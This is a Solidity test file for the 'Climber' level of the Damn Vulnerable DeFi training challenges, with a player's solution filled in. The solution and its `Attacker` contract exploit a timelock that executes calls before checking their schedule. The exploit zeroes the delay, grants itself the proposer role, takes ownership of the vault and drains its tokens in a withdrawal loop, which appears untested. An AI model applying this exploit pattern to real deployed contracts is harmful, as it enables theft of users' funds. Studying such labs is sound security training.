// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
                             address(
                                     new ERC1967Proxy(
                                                      address(new ClimberVault()), // implementation
                                                      abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                                     )
                             )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        Attacker attacker = new Attacker();
        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(attacker);

        uint256[] memory values = new uint256[](4); // init to zeros by default

        bytes[] memory dataElements = new bytes[](4);
        bytes memory changeDelayData = abi.encodeWithSelector(timelock.updateDelay.selector, uint256(0));
        bytes memory addProposerData = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(attacker));
        bytes memory addOwnerData = abi.encodeWithSelector(vault.transferOwnership.selector, player);
        // bytes memory withdrawData = abi.encodeWithSelector(vault.withdraw.selector, address(token), recovery, VAULT_TOKEN_BALANCE);
        bytes memory scheduleData = abi.encodeWithSignature("scheduleWithData()");
        dataElements[0] = changeDelayData;
        dataElements[1] = addProposerData;
        dataElements[2] = addOwnerData;
        dataElements[3] = scheduleData;
        bytes32 salt = bytes32(0);

        attacker.setScheduleData( // Need this to add a schedule in ClimberTimelock first
                                 timelock,
                                 targets,
                                 values,
                                 dataElements,
                                 salt
        );

        timelock.execute(targets, values, dataElements, bytes32(0));

        vm.warp(block.timestamp + 15 days + 1); // Todo update the vault contract to override the withdraw timestamp, so we don't have to wait for 15 days?

        while (true){
            uint256 balance = token.balanceOf(address(vault));
            if (balance > 1 ether){
                balance = 1 ether;
            }
            if (balance == 0){
                break;
            }
            // vm.warp(block.timestamp + 15 days + 1);
            vault.withdraw(address(token), recovery, balance);
        }

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}


contract Attacker{
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    bytes32 public salt;
    ClimberTimelock public timelock;

    function setScheduleData(
                             ClimberTimelock _timelock,
                             address[] memory _targets,
                             uint256[] memory _values,
                             bytes[] memory _dataElements,
                             bytes32 _salt
    ) public {
        targets = _targets;
        values = _values;
        dataElements = _dataElements;
        salt = _salt;
        timelock = _timelock;
    }
    function scheduleWithData() public{
        timelock.schedule(targets, values, dataElements, salt);
    }

}
